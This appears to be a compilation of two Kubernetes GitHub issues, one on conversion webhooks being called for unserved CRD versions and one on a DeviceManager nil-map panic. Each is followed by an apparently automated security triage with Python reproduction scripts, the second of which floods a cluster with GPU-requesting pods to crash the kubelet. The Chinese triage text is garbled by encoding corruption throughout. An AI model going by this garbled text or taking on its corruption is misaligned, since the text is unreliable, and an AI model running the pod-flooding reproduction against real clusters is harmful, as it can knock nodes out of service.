I would expect to only get conversion requests when conversion is required, e.g. if a client requests a CR in a different apiVersion than the one in which the object is stored in etcd.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Kubernetes cluster via kind
```
kind create cluster
```

Deploy the Cluster CRD
```
$ kubectl apply -f ./crd_cluster.yaml
```

<details>

<summary>crd_cluster.yaml</summary>

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  annotations:
    controller-gen.kubebuilder.io/version: v0.17.0
  name: clusters.cluster.x-k8s.io
spec:
  conversion:
    strategy: Webhook
    webhook:
      conversionReviewVersions: ["v1", "v1beta1"]
      clientConfig:
        service:
          namespace: system
          name: webhook-service
          path: /convert
  group: cluster.x-k8s.io
  names:
    kind: Cluster
    listKind: ClusterList
    plural: clusters
    singular: cluster
  scope: Namespaced
  versions:
  - deprecated: true
    name: v1alpha3
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: false
    storage: false
  - deprecated: true
    name: v1alpha4
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: true
    storage: false
  - name: v1beta1
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: true
    storage: true
```

</details>

Deploy the Cluster CR
```
$ kubectl apply -f ./cr_cluster.yaml
```

<details>

<summary>cr_cluster.yaml</summary>

```yaml
kind: Cluster
apiVersion: cluster.x-k8s.io/v1beta1
metadata:
  name: cluster-1
  namespace: default
```

</details>

Observe kube-apiserver logs

```
$ kubectl -n kube-system logs -f kube-apiserver-kind-control-plane
...
E0204 13:21:54.207206       1 watcher.go:567] failed to prepare current and previous objects: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
...

E0204 13:30:47.583960       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found; reinitializing...
W0204 13:30:48.586795       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
...
E0204 13:30:45.575802       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found; reinitializing...
W0204 13:30:46.579452       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
```

Some comments:
* First we deploy a CRD with the following apiVersions:
  * v1alpha3: served: false, storage: false
  * v1alpha4: served: true, storage: false
  * v1beta1: served: true, storage: true
* Then we deploy a v1beta1 Cluster CR
* We can then see in the apiserver logs that the apiserver tries to create a ListWatch for v1alpha3 & v1alpha4
  * This simple example to reproduce the issue doesn't implement an actual conversion webhook, so we simply get errors.
  * If we would implement a conversion webhook the ListWatch would be created successfully and we could observe conversion requests for v1alpha3 / v1alpha4 (as mentioned above roughly for every single create/update of a Cluster CR)
* As not a single CR has been read or written with v1alpha3 or v1alpha4 I would have expected to receive no conversion requests at all. Instead we see a very high number of conversion requests. This problem multiplies with the number of kube-apiserver's.

#### Anything else we need to know?

We opened a Slack thread for this issue and did some initial triage: https://kubernetes.slack.com/archives/C0EG7JC6T/p1736528576393239

While debugging through the apiserver we found the following:
* A GET request to one of our APIs leads to a call of [https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9[â€¦]apiextensions-apiserver/pkg/apiserver/customresource_handler.go](https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9bfcb/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/customresource_handler.go#L611)
* `getOrCreateServingInfoFor` then iterates through all versions of our CRD and calls customresource.NewStorage for them
* Then a few layers deeper reflectors are created for all versions

So if we understand this correctly the apiserver creates reflectors (with list & watch) for all versions of all CRDs (also independent of if the versions are served or not):
![Image](https://github.com/user-attachments/assets/cff93477-913e-4811-aeca-de7dadbe0a43)

We think these reflectors are then later calling the conversion webhooks:
![Image](https://github.com/user-attachments/assets/36dc7888-95c3-4e2e-89e8-471f2668090a)


@sttts opened a PR with the goal to stop creating ListWatches for unserved versions: https://github.com/kubernetes/kubernetes/pull/129709


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.0
```

</details>


#### Cloud provider

<details>
-
</details>


#### OS version

<details>

Apple Silicon M2

</details>


#### Install tools

<details>
-
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
-
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
-
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©  
ï¼ˆåŸå› ï¼šè™½ç„¶é—®é¢˜å¯èƒ½åœ¨ç‰¹å®šæƒ…å†µä¸‹è¯±å‘æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œä½†éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å‘èµ· CR åˆ›å»º/æ›´æ–°æ“ä½œï¼Œä¸”æœ¬è´¨ä¸Šå±äºæ€§èƒ½/èµ„æºæ¶ˆè€—é—®é¢˜ï¼Œä¸æ¶‰åŠç›´æ¥çš„å®‰å…¨æƒé™æå‡æˆ–ä»£ç æ‰§è¡Œé£é™©ã€‚ï¼‰

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„æ˜¯ Kubernetes CRD åœ¨ä½¿ç”¨ conversion webhook æ—¶ï¼Œä¸æ°å½“åœ°å¯¹æ‰€æœ‰ apiVersionsï¼ˆå³ä½¿æœªæä¾›å­˜å‚¨æˆ–æœªè¢«ä½¿ç”¨çš„ç‰ˆæœ¬ï¼‰éƒ½è°ƒç”¨è½¬æ¢ webhookï¼Œä»è€Œå¯¼è‡´å¤§é‡ä¸å¿…è¦çš„è½¬æ¢è¯·æ±‚ã€‚é—®é¢˜æœ¬èº«æ˜¯ä¸€ä¸ªé€»è¾‘é”™è¯¯æˆ–è€…è¯´æ˜¯æ€§èƒ½é—®é¢˜ï¼Œä¼šå¼•èµ· apiserver å’Œ webhook æœåŠ¡æ‰¿å—é¢å¤–è´Ÿè½½ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„åæœã€‚ä½†ç”±äºè§¦å‘è¯¥è¡Œä¸ºéœ€è¦ç”¨æˆ·åˆ›å»ºæˆ–æ›´æ–° CRï¼ˆæ™®é€šæ“ä½œéœ€è¦é¢å¤–æƒé™ï¼‰ï¼Œå› æ­¤å¹¶éå¯ç”±ä»»æ„ç½‘ç»œæ”»å‡»è€…è¿œç¨‹åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿä¸ä¼šç›´æ¥å¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import traceback

from kubernetes import client, config, utils
from kubernetes.client.rest import ApiException

# å®šä¹‰ä¸€ä¸ªç®€å•çš„è½¬æ¢ webhook HTTP å¤„ç†å™¨
class ConversionWebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == "/convert":
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                print("æ”¶åˆ°è½¬æ¢è¯·æ±‚, body:", post_data.decode("utf-8"))
                # è¿”å›ä¸€ä¸ªç®€å•çš„è½¬æ¢å“åº”ï¼Œæ­¤å“åº”ä»…ç”¨äºå¤ç° webhook è¢«è°ƒç”¨çš„ç°è±¡
                # æŒ‰ç…§ Kubernetes conversion webhook çš„è§„èŒƒï¼Œè¿”å› conversionReview å¯¹è±¡
                response_data = {
                    "apiVersion": "apiextensions.k8s.io/v1",
                    "kind": "ConversionReview",
                    "result": {
                        "convertedObjects": [],
                        "result": {"status": "Success"},
                    }
                }
                resp = json.dumps(response_data).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)
            else:
                self.send_error(404)
        except Exception:
            self.send_error(500)
            traceback.print_exc()

    def log_message(self, format, *args):
        # é‡å†™é»˜è®¤æ—¥å¿—ï¼Œä¸æ‰“å°åˆ°stderr
        return

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

def start_webhook_server(server_port):
    server_address = ('', server_port)
    httpd = ThreadingHTTPServer(server_address, ConversionWebhookHandler)
    print(f"å¯åŠ¨è½¬æ¢ webhook HTTP æœåŠ¡å™¨, ç›‘å¬ç«¯å£ {server_port}")
    httpd.serve_forever()

def create_crd(apiext_api):
    crd_manifest = {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {
            "name": "clusters.cluster.x-k8s.io"
        },
        "spec": {
            "group": "cluster.x-k8s.io",
            "versions": [
                {
                    "name": "v1alpha3",
                    "served": False,
                    "storage": False,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                },
                {
                    "name": "v1alpha4",
                    "served": True,
                    "storage": False,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                },
                {
                    "name": "v1beta1",
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                }
            ],
            "scope": "Namespaced",
            "names": {
                "plural": "clusters",
                "singular": "cluster",
                "kind": "Cluster",
                "listKind": "ClusterList"
            },
            "conversion": {
                "strategy": "Webhook",
                # ä½¿ç”¨ clientConfig ä¸­çš„ url æŒ‡å‘æœ¬åœ°å¯åŠ¨çš„ webhook HTTP æœåŠ¡
                "webhook": {
                    "conversionReviewVersions": ["v1", "v1beta1"],
                    "clientConfig": {
                        "url": "http://localhost:10000/convert"
                    }
                }
            }
        }
    }
    try:
        apiext_api.create_custom_resource_definition(crd_manifest)
        print("CRD åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print("CRD å·²ç»å­˜åœ¨")
        else:
            print("åˆ›å»º CRD æ—¶å‘ç”Ÿé”™è¯¯:", e)
            raise

def wait_for_crd_established(apiext_api, name, timeout=60):
    print("ç­‰å¾… CRD æ³¨å†Œå®Œæˆ...")
    end_time = time.time() + timeout
    while time.time() < end_time:
        try:
            crd = apiext_api.read_custom_resource_definition(name)
            for cond in crd.status.conditions:
                if cond.type == "Established" and cond.status == "True":
                    print("CRD å·²å»ºç«‹")
                    return True
        except Exception:
            pass
        time.sleep(2)
    print("ç­‰å¾… CRD å»ºç«‹è¶…æ—¶")
    return False

def create_cluster_cr(custom_api):
    # ä½¿ç”¨ v1beta1 apiVersion åˆ›å»º CR
    cluster_manifest = {
        "apiVersion": "cluster.x-k8s.io/v1beta1",
        "kind": "Cluster",
        "metadata": {
            "name": "cluster-1",
            "namespace": "default"
        },
        "spec": {
            "paused": False
        }
    }
    try:
        custom_api.create_namespaced_custom_object(
            group="cluster.x-k8s.io",
            version="v1beta1",
            namespace="default",
            plural="clusters",
            body=cluster_manifest
        )
        print("Cluster CR åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print("Cluster CR å·²å­˜åœ¨")
        else:
            print("åˆ›å»º Cluster CR æ—¶å‘ç”Ÿé”™è¯¯:", e)
            raise

def update_cluster_cr(custom_api):
    # ç®€å•åœ°æ›´æ–° CR çš„ spec, ä»¥è§¦å‘å¯èƒ½çš„ conversion è¯·æ±‚
    patch = {"spec": {"paused": True}}
    try:
        custom_api.patch_namespaced_custom_object(
            group="cluster.x-k8s.io",
            version="v1beta1",
            namespace="default",
            plural="clusters",
            name="cluster-1",
            body=patch
        )
        print("Cluster CR æ›´æ–°æˆåŠŸ")
    except ApiException as e:
        print("æ›´æ–° Cluster CR æ—¶å‘ç”Ÿé”™è¯¯:", e)
        raise

def main():
    # å¯åŠ¨ webhook HTTP æœåŠ¡ï¼Œç›‘å¬ç«¯å£ 10000ï¼ˆè¦æ±‚ç«¯å£é¡»åœ¨ 10000 ä»¥ä¸Šï¼‰
    server_thread = threading.Thread(target=start_webhook_server, args=(10000,), daemon=True)
    server_thread.start()
    time.sleep(1)  # ç­‰å¾… webhook æœåŠ¡å™¨å¯åŠ¨

    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å‡ºé”™:", e)
        return

    # è·å– API å®¢æˆ·ç«¯
    apiext_api = client.ApiextensionsV1Api()
    custom_api = client.CustomObjectsApi()

    # åˆ›å»º CRD
    create_crd(apiext_api)
    if not wait_for_crd_established(apiext_api, "clusters.cluster.x-k8s.io"):
        print("CRD å»ºç«‹å¤±è´¥ï¼Œé€€å‡º")
        return

    # åˆ›å»º Cluster è‡ªå®šä¹‰èµ„æº
    create_cluster_cr(custom_api)

    # æ‰§è¡Œä¸€ç³»åˆ—æ›´æ–°ï¼Œä»¥è§¦å‘ conversion webhook è¯·æ±‚ï¼ˆæ¯æ¬¡æ›´æ–°å¯èƒ½å¼•å‘å¤šç‰ˆæœ¬è½¬æ¢è°ƒç”¨ï¼‰
    for i in range(3):
        print(f"æ‰§è¡Œç¬¬ {i+1} æ¬¡æ›´æ–°...")
        update_cluster_cr(custom_api)
        time.sleep(5)  # æ¯æ¬¡æ›´æ–°é—´éš”5ç§’

    print("å¤ç°æµ‹è¯•ç»“æŸï¼Œç­‰å¾…10ç§’åé€€å‡º")
    time.sleep(10)

try:
    main()
except Exception:
    traceback.print_exc()
```


---


## Issue #130050 aftert re-allocating DeviceManager panic on Allocate()

- Issue é“¾æ¥ï¼š[#130050](https://github.com/kubernetes/kubernetes/issues/130050)

### Issue å†…å®¹

#### What happened?

Based on the following stack trace ,The issue is potentially caused by one goroutine  re-allocate device plugin and delete devicesToReuse map [m.devicesToReuse map deleted]
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/manager.go#L376
At the same time, another process is allocating resources ,when creating Pods concurrently
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/manager.go#L401
Another goroutine is allocating device plugin . The devicesToReuse map will be later used in removeContainerAllocatedResources()
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/pod_devices.go#L161
which caused panic.  func by itself is not thread-safe


Stack trace:
`Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: I1119 15:07:43.942671   11035 manager.go:956] needs re-allocate device plugin resources for pod dag-process-debug-1858716533183492096-202303328_dag-process(4604c558-bfdd-427c-81c9-f1d8a5aea6e7), container main
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.952908939+08:00" level=debug msg="Calling GET /v1.40/images/10.73.150.98:5000/ai-train/onenode:A100_v8/json"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.954568826+08:00" level=debug msg="Downloaded c4221d178521 to tempfile /data1/cce/docker/tmp/GetImageBlob288125387"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.955529075+08:00" level=debug msg="Calling POST /v1.40/containers/create?name=k8s_main_dag-process-debug-1858716533183492096-202303328_dag-process_4604c558-bfdd-427c-81c9-f1d8a5aea6e7_0"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.997696667+08:00" level=debug msg="container mounted via layerStore: &{/data1/cce/docker/overlay2/cf3eea52e7a535afb239d7826d046805c1dfda4fa18eedb3c553ea181d6f7ae5/merged 0x45cc320 0x45cc320}" container=47fdc4b3d17b1d03fcbe58afe8c229ab5132d6d4da237cc9961757a11358cfe6
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: panic: assignment to entry in nil map
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: goroutine 173 [running]:
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*podDevices).removeContainerAllocatedResources(0x376f8e0?, {0xc003478030?, 0xc003478030?}, {0xc003280108, 0x4}, 0x0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/devicemanager/pod_devices.go:157 +0x30f
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).Allocate(0xc00119bc70, 0xc003e40008, 0xc000caa2c0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/devicemanager/manager.go:388 +0x405
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*scope).allocateAlignedResources(0x0?, 0xc003e40008, 0xc000caa2c0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope.go:146 +0x5c
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*scope).admitPolicyNone(0xc000a10370, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope.go:134 +0x1ab
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*containerScope).Admit(0xc000a10370, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope_container.go:49 +0x8b
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*manager).Admit(0xc000f132e0, 0xc0000529e0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/topology_manager.go:190 +0xa5
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).canAdmitPod(0xc000b3c008, {0xc002a70500, 0x1a, 0x20}, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1800 +0xf2
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).HandlePodAdditions(0xc000b3c008, {0xc001a8c040, 0x1, 0x1})
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:2074 +0x1ac
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoopIteration(0xc000b3c008, 0xc001097380, {0x467a9b8, 0xc000b3c008}, 0xc001e00f60, 0xc001e00fc0, 0xc001411da0)
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1919 +0xe22
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoop(0xc000b3c008, 0xc001097380, {0x467a9b8, 0xc000b3c008})
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1862 +0x39c
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).Run(0xc000b3c008, 0xc001097380)
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1442 +0x808
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: created by k8s.io/kubernetes/cmd/kubelet/app.startKubelet in goroutine 1
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/cmd/kubelet/app/server.go:1183 +0xbf`

#### What did you expect to happen?

DeviceManager Allocate() should be able to handle such race thread-safely.

#### How can we reproduce it (as minimally and precisely as possible)?

When we concurrently create a large number of Pods with device equipment, it may be triggered, provided that the concurrency is high.

#### Anything else we need to know?

This issue is similar to #103838 but not the same. We have also reproduced the #103838 issue. After applying the fix from #108831, the current issue occurred, which suggests that the non-thread-safety of the devicesToReuse map may lead to other problems.

#### Kubernetes version

<details>

```console
kubelet version ï¼š 1.20.8 
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯ Kubernetes ä¸­ DeviceManager çš„ Allocate() æ–¹æ³•å› å¹¶å‘æ“ä½œå¯¼è‡´çš„ panic é—®é¢˜ã€‚å…·ä½“æƒ…å†µæ˜¯åœ¨é‡åˆ†é…è®¾å¤‡æ’ä»¶æ—¶ï¼Œå¤šä¸ª goroutine åŒæ—¶å¯¹éçº¿ç¨‹å®‰å…¨çš„ devicesToReuse map è¿›è¡Œæ“ä½œï¼Œé€ æˆ map è¢«åˆ é™¤æˆ–æœªåˆå§‹åŒ–çš„çŠ¶æ€ä¸‹è¿›è¡Œå†™æ“ä½œï¼Œä»è€Œè§¦å‘ panicã€‚é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ç”±äºæ•°æ®ç»“æ„æ²¡æœ‰åšåˆ°å¹¶å‘å®‰å…¨ï¼Œå¯¼è‡´åœ¨é«˜å¹¶å‘åˆ›å»º Pod è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°å¼‚å¸¸ä¸­æ–­ï¼ˆå³æ‹’ç»æœåŠ¡ï¼‰çš„æƒ…å†µã€‚

æ ¹æ®æè¿°ï¼Œè¯¥é—®é¢˜ä¼šåœ¨å¹¶å‘åˆ›å»ºå¤§é‡ä½¿ç”¨è®¾å¤‡çš„ Pod æ—¶å¤ç°ï¼Œè™½ç„¶å¯¼è‡´çš„å½±å“ä¸º kubelet crash æˆ– Pod åˆ†é…å¤±è´¥ï¼Œä½†è§¦å‘æ¡ä»¶è¦æ±‚æ”»å‡»è€…å…·å¤‡åˆ›å»º Pod çš„æƒé™ï¼ˆéåªè¯»æƒé™ï¼‰ï¼Œè¿™è¯´æ˜åœ¨å¤§å¤šæ•°ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåªæœ‰å…·å¤‡è¾ƒé«˜æƒé™çš„ç”¨æˆ·æ‰å¯èƒ½å¼•å…¥è¯¥é—®é¢˜ã€‚å¦å¤–ï¼Œè¯¥é—®é¢˜å¹¶ä¸ä¼šå¼•å…¥è®¤è¯ä¿¡æ¯æ³„æ¼ã€è¿œç¨‹ä»£ç æ‰§è¡Œç­‰ç›´æ¥å¯¼è‡´ç³»ç»Ÿè¢«å®Œå…¨æ”»é™·çš„é«˜é£é™©æƒ…å½¢ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜è™½ç„¶å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œä½†ç”±äºå…¶åˆ©ç”¨éœ€è¦è¾ƒé«˜æƒé™ï¼Œå¹¶éå®Œå…¨å¤–éƒ¨æ”»å‡»è€…èƒ½å¤Ÿè½»æ˜“è§¦å‘ï¼Œå› æ­¤é£é™©è¯„çº§æŒ‰ç…§ä»¥ä¸‹æ ‡å‡†å¯åˆ¤æ–­ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import uuid
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# å®šä¹‰å…¨å±€è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
TOTAL_TIMEOUT = 120

def create_pod(api_instance, namespace, pod_name):
    """
    åˆ›å»ºä¸€ä¸ªåŒ…å«è®¾å¤‡èµ„æºï¼ˆæ¨¡æ‹Ÿè®¾å¤‡è¯·æ±‚ï¼‰çš„ Pod
    """
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name},
        "spec": {
            "containers": [
                {
                    "name": "device-test",
                    "image": "busybox",
                    "args": ["sleep", "3600"],
                    # å‡è®¾è®¾å¤‡æ’ä»¶æä¾›çš„èµ„æºåç§°ä¸º nvidia.com/gpu
                    "resources": {
                        "limits": {"nvidia.com/gpu": "1"},
                        "requests": {"nvidia.com/gpu": "1"}
                    }
                }
            ],
            # è®¾ç½® restartPolicy é˜²æ­¢ Pod é‡å¯é€ æˆé¢å¤–è´Ÿè½½
            "restartPolicy": "Never"
        }
    }
    try:
        api_instance.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print(f"Pod {pod_name} åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        print(f"Pod {pod_name} åˆ›å»ºå¤±è´¥: {e}")
        traceback.print_exc()

def delete_pod(api_instance, namespace, pod_name):
    """
    åˆ é™¤æŒ‡å®š Pod
    """
    try:
        api_instance.delete_namespaced_pod(name=pod_name, namespace=namespace)
        print(f"Pod {pod_name} åˆ é™¤æˆåŠŸ")
    except ApiException as e:
        print(f"Pod {pod_name} åˆ é™¤å¤±è´¥: {e}")
        traceback.print_exc()

def main():
    start_time = time.time()
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥ï¼Œè¯·æ£€æŸ¥é…ç½®æ˜¯å¦å­˜åœ¨äºé»˜è®¤ä½ç½®ã€‚")
        return

    v1 = client.CoreV1Api()
    namespace = "default"

    # å®šä¹‰éœ€è¦åŒæ—¶åˆ›å»ºçš„ Pod æ•°é‡ï¼Œç”¨äºè§¦å‘é«˜å¹¶å‘æƒ…å†µ
    pod_count = 30
    pod_names = [f"device-test-{str(uuid.uuid4())[:8]}" for _ in range(pod_count)]
    futures = []
    executor = ThreadPoolExecutor(max_workers=10)

    print("å¼€å§‹å¹¶å‘åˆ›å»º Pod ...")
    for pod_name in pod_names:
        # æäº¤ä»»åŠ¡åˆ›å»º Pod
        future = executor.submit(create_pod, v1, namespace, pod_name)
        futures.append(future)

    # ç­‰å¾…æ‰€æœ‰åˆ›å»ºä»»åŠ¡å®Œæˆï¼ˆè®¾ç½®è¶…æ—¶ä¿æŠ¤ï¼‰
    try:
        for future in as_completed(futures, timeout=TOTAL_TIMEOUT):
            # å¦‚æœä»»åŠ¡ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œå°†åœ¨è¿™é‡Œæ•è·
            future.result()
    except Exception as e:
        print("Pod åˆ›å»ºè¿‡ç¨‹å‡ºç°å¼‚å¸¸æˆ–è¶…æ—¶:", e)

    # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œè§‚å¯Ÿ Pod çŠ¶æ€ï¼ˆæ¨¡æ‹ŸæŒç»­å¹¶å‘çš„åœºæ™¯ï¼‰
    wait_seconds = 10
